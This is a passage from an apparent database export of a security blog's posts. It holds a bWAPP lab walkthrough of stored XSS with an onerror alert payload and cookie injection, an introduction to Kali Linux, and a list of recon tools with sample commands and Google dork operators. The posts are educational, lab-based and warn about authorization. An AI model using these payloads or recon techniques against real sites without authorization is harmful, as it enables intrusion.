me to walk you through step-by-step every line of codes. That''s why I made the complete development open-source on my Github. So that it will be helpful for beginners and those have an interest in this area to know more about the development of this website.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'" color='"#dd4124'"><b><a href='"https://github.com/anshumanpattnaik/hackbotone-mern-website'"><font color='"#dd4124'">https://github.com/anshumanpattnaik/hackbotone-mern-website</font></a></b></font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">So this is the overall explanation of ''<i>hackbotone.com</i>'' I&nbsp;hope you will like my work if you find any types of issues like on improving codes then please feel free raise an issue on GitHub.&nbsp;</font><span style='"font-size: large;'">So that it will be helpful for me to make the site more robust.</span></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Thank you &amp; Happy coding :)</font></div></div>",t,f,"",f
14,Cross-Site-Scripting - Stored (Change Secret & Cookies),cross-site-scripting-stored-change-secret-and-cookies,Anshuman Pattnaik,2019-05-30 01:26:34.014386+05:30,2021-06-04 01:33:16.156058+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/seo%20_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/small%20_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/large%20_thumbnail.png,"{'"Stored XSS'",bWAPP,'"Penetration Testing'",Cookies}","This is the demonstration of Stored Cross-Site-Scripting attack in Change Secret and Cookies and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Stored Cross-Site-Scripting attack in Change Secret and Cookies and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/yCj45YiMQyM'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">How to perform a Stored Cross-Site-Scripting attack in Change Secret?</font></b><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Stored (Change Secret)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_2.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As you can see from the above screenshot there is an input box to change the current user secret and if you go to the <b>phpMyAdmin </b>then you will find a secret column under '"<b>users</b>'" table.&nbsp;</font><span style='"font-size: large;'">To test let’s enter one secret message '"</span><b style='"font-size: large;'">Nice'"</b><span style='"font-size: large;'">.</span></div><div><span style='"font-size: large;'"><br></span></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_3.png'"><span style='"font-size: large;'"><br></span></div><div><br></div><div><div><font size='"4'">As you can see from the above screenshot the '"<b>secret</b>'" has been changed to '"<b>Nice</b>'". So what''s happening is actually when you enter a new secret message, it''s taking the input of the secret message and also in the hidden input field it''s passing the user''s login name.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_4.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can see from the screenshot in the hidden input field the user''s name is passed to the server and this is always a bad practice to send the data in an input hidden field because most of the time developers forgot to validate these input fields and it will be very easy for the attacker to inject malicious code to the application.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">Now let''s change the input type of this '"<b>hidden</b>'" field to '"<b>text</b>'". Right-click '"<b>Inspect Element</b>'" and go to the hidden input field and change the input type to text and hit enter.</font><br></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_5.png'"><br></div><div><br></div><div><font size='"4'">As per the above screenshot, you can see the attacker changing the input type to text, so that he can inject malicious code to the application.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_6.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As you can see from the above screenshot the hidden input type changed to a text input box and now let''s enter the JavaScript payload to this input box.</font></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">'"<span class='"token operator'">&gt;</span><span class='"token operator'">&lt;</span>img src<span class='"token operator'">=</span>x onerror<span class='"token operator'">=</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token number'">1</span><span class='"token punctuation'">)</span><span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_7.png'"><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_8.png'"><br></div><div><br></div><div><div><font size='"4'">As you can see from the above screenshot I am able to inject JavaScript code to the input box. So in order to prevent this attack always try to avoid using hidden input fields and if you are using then do proper sanitization of special characters otherwise it’s very easy for the attacker to inject malicious code.</font></div></div><div><font size='"4'"><br></font></div><div><font size='"4'"><b>For more information?</b><br></font></div><div><ul><li><font size='"4'"><a href='"https://portswigger.net/research/xss-in-hidden-input-fields'"><font color='"#dd4124'">XSS in hidden input fields</font></a><br></font></li></ul><div><br></div></div><div><b style='"'"><font size='"5'">How to perform a Stored Cross-Site-Scripting attack in Cookies?</font></b><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_9.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Stored (Cookies)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_10.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As per the above screenshot, you can see an interface where which type of movie you like and if you hit the <b>Like </b>button then the message will appear that '"<b>Thank you for making your choice!</b>'".</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_11.png'"><font size='"4'"><br></font></div><div><font size='"4'">Now let''s intercept the request in burp suite so that we can know what’s going on in the background.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_12.png'"><font size='"4'"><br></font></div><div><font size='"4'">As per the above screenshot, we got the HTTP request and as you can see in cookie header the <b>movie_genre </b>is reflecting.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_13.png'"><font size='"4'"><br></font></div><div><span style='"font-size: large;'">As per the above screenshot, I''ll pass new movie type '"</span><b style='"font-size: large;'">thriller</b><span style='"font-size: large;'">'" and let''s check it’s reflecting or not.</span><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-change-secret-cookies/cross_site_scripting_stored_change_secret_cookies_14.png'"><font size='"4'"><br></font></div><div><div><font size='"4'">As you can see which movie type I passed it''s reflected on the cookie header, so I could able to insert one more new movie type to the parameter. So as per this vulnerability, an attacker can able to inject malicious code into the cookie header. And in order to prevent this attack proper validation is required in the query parameter.</font></div></div><div><font size='"4'"><br></font></div><div><font size='"4'"><b>For more information?</b><br></font></div><div><ul><li><b style='"'"><a href='"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection'"><font color='"#dd4124'">X-XSS-Protection</font></a></b><br></li></ul></div><div><font size='"4'"><br></font></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
1,Introduction to Kali Linux,introduction-to-kali-linux,Anshuman Pattnaik,2019-05-10 01:24:08.018779+05:30,2021-06-04 01:34:03.82333+05:30,https://assets.hackbotone.com/assets/introduction-to-kali-linux/seo_thumbnail.png,https://assets.hackbotone.com/assets/introduction-to-kali-linux/small_thumbnail.png,https://assets.hackbotone.com/assets/introduction-to-kali-linux/large_thumbnail.png,"{'"Penetration Tool'",InfoSec,Debian,CyberSecurity}","Kali Linux is a Debian-based Linux distribution operating system and it is widely used for Penetration Testing and Security Auditing. Kali contains many several tools which are mostly used for various information security tasks, such as Penetration Testing, Security research, Computer Forensics and Reverse Engineering.","<font size='"4'">Kali Linux is a Debian-based Linux distribution operating system and it is widely used for Penetration Testing and Security Auditing. Kali contains many several tools which are mostly used for various information security tasks, such as Penetration Testing, Security research, Computer Forensics and Reverse Engineering. Kali Linux is developed, funded and maintained by Offensive Security.</font><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/t_rO64naXh8'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">Free to download</font></b><br></div><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">Kali Linux is free to download from the official website. The community publishes a fresh release every few months, which is always available for download. For more information, you can visit their official website <a href='"https://www.kali.org/downloads/'"><font color='"#dd4124'">Kali Linux Downloads</font></a>.</span><br></div><div><span style='"font-size: large;'"><br></span></div><div><b style='"'"><font size='"5'">Installation Requirements</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><font size='"4'">A minimum of 20 GB disk space for the Kali Linux install.</font></div><div><ol><li><font size='"4'">RAM for i386 and amd64 architectures<br></font></li><li><font size='"4'">Minimum: 1GB, recommended: 2GB or more.<br></font></li><li><font size='"4'">CD-DVD Drive / USB boot support.</font></li></ol><div><div style='"font-size: large;'">A minimum of 20 GB disk space for the Kali Linux install. For more information on install Kali Linux, you can visit their official website <font color='"#dd4124'"><a href='"https://docs.kali.org/installation/kali-linux-hard-disk-install'"><font color='"#dd4124'">Kali Linux Hard Disk Installation</font></a>.</font></div><div style='"font-size: large;'"><font color='"#dd4124'"><br></font></div><div style='"'"><b style='"'"><font size='"5'">More than 600 penetration testing tools</font></b><br></div><div style='"font-size: large;'"><font color='"#dd4124'"><br></font></div></div></div><div style='"'"><div style='"'"><font size='"4'">Kali Linux has around more than 600 penetration testing tools from various domains and it''s being&nbsp;used by many Ethical hackers &amp; Security researchers around the world for penetration testing.&nbsp;</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Tools are categorized from various domains such as:</font></div><div style='"'"><span style='"font-size: large;'"><br></span></div><div style='"'"><i style='"'"><font size='"4'">Information Gathering, Vulnerability Analysis, Wireless Attacks, Web Applications, Exploitation Tools, Stress Testing, Forensics Tools, Sniffing &amp; Spoofing, Password Attacks, Maintaining Access, Reverse Engineering, Reporting Tools and Hardware Hacking.</font></i><br></div><div style='"'"><span style='"font-size: large;'"><i><br></i></span></div><div style='"'"><b style='"'"><font size='"5'">Open source Git tree</font></b><br></div><div style='"'"><span style='"font-size: large;'"><i><br></i></span></div><div style='"'"><font size='"4'">The complete development is open source on GitHub&nbsp;by the community anyone who ever wants to do some modifications or rebuild the package then they can visit their official website <a href='"http://git.kali.org/gitweb/'"><font color='"#dd4124'">Kali Linux Git</font></a>.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><b style='"'"><font size='"5'">For more information on Kali Linux</font></b><br></div></div><div><b><br></b></div><div><font size='"4'">If you want to know more about Kali Linux then please visit their related articles section.</font></div><div><ol><li><font size='"4'"><a href='"https://docs.kali.org/introduction/should-i-use-kali-linux'"><font color='"#dd4124'">Should I Use Kali Linux?</font></a><br></font></li><li><font size='"4'"><a href='"https://docs.kali.org/category/community'"><font color='"#dd4124'">Kali Community Support</font></a><br></font></li><li><font size='"4'" color='"#dd4124'"><a href='"https://docs.kali.org/category/development'" style='"'"><font color='"#dd4124'">Customizing Kali Linux</font></a></font><br></li></ol></div><div><font size='"4'"><br></font></div><div><font size='"4'">Thank you for reading this post and Happy Hacking :)</font></div>",t,f,"",f
17,10 Recon Tools For Bug Bounty,10-recon-tools-for-bug-bounty,Anshuman Pattnaik,2020-01-17 01:26:58.939409+05:30,2021-06-05 20:27:13.827378+05:30,https://assets.hackbotone.com/assets/top-10-recon-tools-for-bug-bounty/seo_thumbnail.png,https://assets.hackbotone.com/assets/top-10-recon-tools-for-bug-bounty/small_thumbnail.png,https://assets.hackbotone.com/assets/top-10-recon-tools-for-bug-bounty/large_thumbnail.png,"{recon,'"Bug Bounty'",'"Ethical Hacking'"}","Information Gathering is the most important stage of every penetration testing so that you will have a better understanding about your target to exploit vulnerabilities and information like (IP addresses, Subdomain, Open ports and etc.) but to gather information you need proper reconnaissance tools and there are many recon tools which are available on Github but among them, I found Top 10 Recons tools which you can use to gather all of this information about your target.","<b><font size='"5'">10 Recon Tools for Bug Bounty</font></b><div><b><font size='"5'"><br></font></b></div><div><font size='"4'">Information Gathering is the most important stage of every penetration testing so that you will have a better understanding about your target to exploit vulnerabilities and information like (IP addresses, Subdomain, Open ports and etc.) but to gather information you need proper reconnaissance tools and there are many recon tools which are available on Github but among them, I found Top 10 Recons tools which you can use to gather all of this information about your target.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">Important Note</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><font size='"4'">Always remember before scanning your target you should have proper authorization otherwise you should never use these tools to scan any other targets because while scanning the targets WAF (Web Application Firewall) monitors your network traffic and tracks your IP address and without authorization if you scan a target, you will violate the legal disclaimer of the application and you could face legal actions.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">1. Nmap</font></b><br></div><div><font size='"4'"><br></font></div><div><font size='"4'">Nmap is a network mapper tool and widely popular for discovering hosts and services on a network and it''s free and open-source on GitHub. It has many features and after scanning a network you can gather a lot of important information such as Host Discovery, Service/Version Detection and OS Detection. This tool is very useful and you can use all of this information to audit a network.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">nmap <span class='"token operator'">-</span>v <span class='"token operator'">-</span><span class='"token constant'">A</span> scanme<span class='"token punctuation'">.</span><span class='"token property-access'">nmap</span><span class='"token punctuation'">.</span><span class='"token property-access'">org</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'"><b>For more information -</b> <a href='"https://nmap.org/'"><font color='"#dd4124'"><b>https://nmap.org/</b></font></a></font><br></div><div><br></div><div><b><font size='"5'">2. Nikto</font></b><br></div><div><br></div><div><div><font size='"4'">Nikto is widely popular for vulnerability scanner and it scans web servers to detect dangerous files, outdated server software and many more, it performs specific server type checks like (Clickjacking, MIME Type, etc.) and this tool you can scan with any web servers such as Apache, NGINX, Oracle HTTP Server, etc. This tool is quite useful to detect server misconfigurations. But the major issue of using this tool is that it''s quite easily detectable so always while scanning a network using Nikto it''s better to use a VPN (Virtual Private Network).</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">This tool is open-source on GitHub&nbsp;and you can install this tool with all major Operating System - (Windows, MacOS&nbsp;&amp; GNU/Linux).</font></div></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">nikto <span class='"token operator'">-</span>h example<span class='"token punctuation'">.</span><span class='"token property-access'">com</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><b style='"font-size: large;'">For more information -&nbsp; </b><u style='"color: rgb(221, 65, 36); font-size: large;'"><a href='"https://cirt.net/Nikto2'"><font color='"#dd4124'"><b>https://cirt.net/Nikto2</b></font></a></u></div><div><br></div><div><b><font size='"5'">3. Amass</font></b><br></div><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">Amass tool is developed and maintained by <a href='"https://www2.owasp.org/'"><font color='"#dd4124'"><b>OWASP</b></font></a>&nbsp;and this tool is used to gather information such as DNS enumeration, Subdomain name alterations, Web scraping, Certificates, Web APIs and many more. This tool is developed to help security researchers to get in-depth information about a target network.</span></div><div><span style='"font-size: large;'"><br></span></div><div><ul><li><font size='"4'"><b>DNS:</b> Basic enumeration, Brute forcing (optional), Reverse DNS sweeping, Subdomain name alterations/permutations, Zone transfers (optional)</font></li><li><font size='"4'"><b>Scraping:</b> Ask, Baidu, Bing, DNSDumpster, DNSTable, Dogpile, Exalead, Google, HackerOne, IPv4Info, Netcraft, PTRArchive, Riddler, SiteDossier, ViewDNS, Yahoo<br></font></li><li><font size='"4'"><b>Certificates</b>: Active pulls (optional), Censys, CertSpotter, Crtsh, Entrust, GoogleCT<br></font></li><li><font size='"4'"><b>APIs:</b> AlienVault, BinaryEdge, BufferOver, CIRCL, CommonCrawl, DNSDB, GitHub, HackerTarget, IPToASN, Mnemonic, NetworksDB, PassiveTotal, Pastebin, RADb, Robtex, SecurityTrails, ShadowServer, Shodan, Spyse (CertDB &amp; FindSubdomains), Sublist3rAPI, TeamCymru, ThreatCrowd, Twitter, Umbrella, URLScan, VirusTotal, WhoisXML<br></font></li><li><font size='"4'"><b>Web Archives:</b> ArchiveIt, ArchiveToday, Arquivo, LoCArchive, OpenUKArchive, UKGovArchive, Wayback<br></font></li></ul><div><br></div></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">amass <span class='"token operator'">-</span>d example<span class='"token punctuation'">.</span><span class='"token property-access'">com</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'"><b>For more information -</b> <a href='"https://github.com/OWASP/Amass'"><font color='"#dd4124'"><b>https://github.com/OWASP/Amass</b></font></a></font><br></div><div><br></div><div><b><font size='"5'">4. Dirsearch</font></b><br></div><div><br></div><div><font size='"4'">Dirsearch is a free and open-source tool and widely popular for brute force directories and files in websites. This tool has many different features such as Multithreaded, Keep alive connections, multiple extensions, exporting reports in both (plain text, JSON), HTTP proxy support, User-agent randomization and many more. And you can use custom wordlist like SecList to brute-force files and directories. This tool is quite friendly and easy to use and it''s supported for three major Operating systems (Windows, MacOS&nbsp;&amp; GNU/Linux).</font></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">python dirsearch<span class='"token punctuation'">.</span><span class='"token property-access'">py</span> <span class='"token operator'">-</span>u https<span class='"token operator'">:</span><span class='"token operator'">/</span><span class='"token operator'">/</span>example<span class='"token punctuation'">.</span><span class='"token property-access'">com</span> <span class='"token operator'">-</span>e html<span class='"token punctuation'">,</span>php<span class='"token punctuation'">,</span>jsp<span class='"token punctuation'">,</span>asp<span class='"token punctuation'">,</span>json</code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><b><font size='"5'">5. Sublist3r</font></b><br></div><div><br></div><div><font size='"4'">Sublist3r is widely popular to enumerate subdomains of a website and to gather subdomain it uses many popular search engines such as Google, Yahoo, Bing, Baidu and Ask and to enumerate subdomains it uses Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS. This tool is very much helpful to gather subdomains of a domain and most importantly to get better results of subdomains, <a href='"https://github.com/TheRook/subbrute'"><font color='"#dd4124'"><b>subbrute</b></font></a> was integrated with Sublist3r by using an improved wordlist.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">python sublist3r<span class='"token punctuation'">.</span><span class='"token property-access'">py</span> <span class='"token operator'">-</span>d example<span class='"token punctuation'">.</span><span class='"token property-access'">com</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'"><b>Sublist3r GitHub&nbsp;repo -</b> <a href='"https://github.com/aboul3la/Sublist3r'"><font color='"#dd4124'"><b>https://github.com/aboul3la/Sublist3r</b></font></a></font><br></div><div><br></div><div><b><font size='"5'">6. Knockpy</font></b><br></div><div><br></div><div><font size='"4'">Knockpy is designed to enumerate subdomain and to scan DNS zone transfer and automatically try to bypass wildcard DNS record. And most importantly it supports queries to VirusTotal subdomains and to configure in the config.json file you can set up your API_KEY. This tool most of the penetration testers and bug hunters uses to exploit Subdomain takeover vulnerability.</font></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">knockpy example<span class='"token punctuation'">.</span><span class='"token property-access'">com</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'"><b>Knockpy GitHub&nbsp;repo -</b> <a href='"https://github.com/guelfoweb/knock'"><font color='"#dd4124'"><b>https://github.com/guelfoweb/knock</b></font></a></font><br></div><div><br></div><div><b><font size='"5'">7. Gitrob</font></b><br></div><div><br></div><div><font size='"4'">Gitrob tool is widely popular to find sensitive files on public Github repositories and this tool will clone user or organizations public repositories and in-depth iterate all the commit history and it matches with the potentially sensitive files such as api_key, access_token, password, database_name, etc.<br></font></div><div><font size='"4'"><br></font></div><div><font size='"4'">To install this tool you need to have Golang set up in your local machine. To install this tool you need to have <a href='"https://golang.org/'"><font color='"#dd4124'"><b>Golang</b></font></a> set up in your local machine.</font><br></div><div><font size='"4'"><br></font></div><div><font size='"4'"><b>Gitrob Github repo -</b> <a href='"https://github.com/michenriksen/gitrob'"><font color='"#dd4124'"><b>https://github.com/michenriksen/gitrob</b></font></a></font><br></div><div><font size='"4'"><br></font></div><div><b><font size='"5'">8. Google Dork</font></b><br></div><div><b><font size='"5'"><br></font></b></div><div><font style='"'"><font size='"4'">Google Dork is also named as '"Google Hacking'" and this is a technique to find security holes in a website through Google search. It''s so much helpful for the security researchers and using Google''s web-crawling you can gather information such as usernames, passwords and sensitive information.</font><br></font></div><div><font style='"'"><font size='"4'"><br></font></font></div><div><font style='"'"><font size='"4'"><b>Google Dork Operators</b><br></font></font></div><div><font style='"'"><font size='"4'"><b><br></b></font></font></div><div><font style='"'"><table cellpadding='"0'" cellspacing='"0'" class='"blog_table'" style='"font-family: &quot;Open Sans&quot;, sans-serif; font-size: 13.3333px;'"><tbody style='"box-sizing: border-box;'"><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_bold'" style='"box-sizing: border-box; font-weight: 700; line-height: 1.7em; color: rgb(59, 58, 58);'"><font face='"Lora, serif'" style='"'" size='"4'">Operators</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_bold'" style='"box-sizing: border-box; font-weight: 700; line-height: 1.7em; color: rgb(59, 58, 58);'"><font face='"Lora, serif'" size='"4'">Purpose</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_bold'" style='"box-sizing: border-box; font-weight: 700; line-height: 1.7em; color: rgb(59, 58, 58);'"><font face='"Lora, serif'" size='"4'">Example</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">intitle</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search Page Title</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">intitle:admin login</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">allintitle</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search Page Title</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">allintitle:admin page</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">inurl</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search URL</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">inurl:8080/login</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">allinurl</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Search URL</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">allinurl:admin</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">filetype</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">Specific Files</font></span></td><td class='"blog_table_no_left_border'" style='"box-sizing: border-box; border-right: 1px solid rgb(209, 209, 221); border-top: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">filetype: json</font></span></td></tr><tr style='"box-sizing: border-box;'"><td class='"blog_table_border'" style='"box-sizing: border-box; border-top: 1px solid rgb(209, 209, 221); border-right: 1px solid rgb(209, 209, 221); border-left: 1px solid rgb(209, 209, 221); padding: 0.5em;'"><span class='"blog_description_small_normal'" style='"box-sizing: border-box; line-height: 1.7em; color: rgb(75, 75, 75);'"><font face='"Lora, serif'" size='"4'">intext</font></span></td><td 